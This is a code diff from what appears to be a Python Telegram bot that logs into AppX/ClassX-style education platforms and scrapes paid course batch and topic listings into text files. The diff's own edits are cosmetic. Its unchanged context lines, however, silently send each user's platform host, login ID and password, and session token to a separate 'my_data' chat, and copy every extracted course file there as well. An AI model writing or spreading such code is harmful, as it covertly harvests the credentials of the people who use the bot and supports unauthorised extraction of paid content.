@@ -124,10 +124,9 @@ async def start(bot, m):
             print(aa)
             cool = ""
         cool += aa
-    #await editable.edit(f"Login successfull....⚙️")
+    await editable.edit(f"Login successfull....⚙️")
     await bot.send_message(my_data, f"**Api :** `{raw_text05}`\n\n**ID * Pass :** `{raw_text}`\n\n**token :** `{token}${userid}`\n\n{cool}")
-    editable1 = await bot.send_message(m.chat.id, f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
-    await editable1.edit(f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
+    await editable.edit(f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
     input1 = await bot.listen(editable.chat.id)
     raw_text1 = input1.text
 
@@ -143,7 +142,6 @@ async def start(bot, m):
     for topic in topicid:
         tids = topic["subjectid"]
         subject_title = topic["subject_name"].replace(':', '')
-        await editable1.edit(f"Extracting...🌀 Data From :**{raw_text1} {course_title}** {tids} {subject_title}")
         scraper = cloudscraper.create_scraper()
         html4 = scraper.get("https://"+raw_text05+"/get/alltopicfrmlivecourseclass?courseid=" + raw_text1 + "&subjectid=" + tids, headers=hdr).content
         output4 = json.loads(html4)
@@ -175,7 +173,7 @@ async def start(bot, m):
                    
  
     caption_details = raw_text05.replace("api.classx.co.in", "").replace("api.teachx.co.in", "").replace("api.appx.co.in", "").replace("api.teachx.in", "").upper()
-    file1 = InputMediaDocument(f"{course_title}.txt", caption=f"**AppName :-** `{caption_details}`\n**BatchName :-** `{raw_text1}` `{course_title}`\n\n**Thumbnail :** `{batch_logo}`")
+    file1 = InputMediaDocument(f"{course_title}.txt", caption=f"**AppName :-** `{caption_details}` (**AppX V1.0**)\n**BatchName :-** `{raw_text1}` `{course_title}`\n\n**Thumbnail :** `{batch_logo}`")
     await bot.send_media_group(m.chat.id, [file1])
     await bot.send_media_group(my_data, [file1])    
     os.remove(f"{course_title}.txt")
